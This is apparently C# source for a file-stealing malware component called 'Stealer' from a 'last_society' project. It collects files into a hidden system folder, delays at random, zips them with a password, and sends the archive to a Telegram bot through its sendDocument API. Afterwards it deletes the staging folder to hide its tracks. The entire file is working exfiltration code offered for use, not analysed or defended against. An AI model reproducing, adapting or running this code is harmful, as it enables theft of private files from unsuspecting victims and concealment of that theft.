using Ionic.Zip;
using Ionic.Zlib;
using System;
using System.IO;
using System.Text;
using System.Threading;

//use it is... if it's for the public good
namespace last_society
{

    public static class Stealer
    {
        [STAThread]
        public static void GetStealer()
        {

            Directory.CreateDirectory(Help.last_society);


            File.SetAttributes(Help.dir, FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System);

            GetFiles.Inizialize(Help.last_society);
            Thread.Sleep(new Random(Environment.TickCount).Next(10000, 20000));


            string zipName = "last.s.i.y" + ".zip";
            using (ZipFile zip = new ZipFile(Encoding.GetEncoding("cp866")))
            {
                zip.CompressionLevel = CompressionLevel.BestCompression;
                zip.Comment = "last_society project"
                       
                    ;
                zip.Password = Program.passwordzip;
                zip.AddDirectory(@"" + Help.last_society);
                zip.Save(@"" + zipName);
            }


            string LOG = @"" + zipName;
            byte[] file = File.ReadAllBytes(LOG);
            string url = string.Concat(new string[]
            {       Help.ApiUrl,
                    Program.Token,
                    "/sendDocument?chat_id=",
                    Program.ID,
                    "&caption=\n📂 FileGrabber: "   + GetFiles.count
        });

            try
            {
                SenderAPI.POST(file, LOG, "application/x-ms-dos-executable", url);
                Directory.Delete(Help.dir + "\\", true);
            }
            catch
            {

            }

        }
    }
}
 

















































































































































































































































































































































//this project was created for the last society 

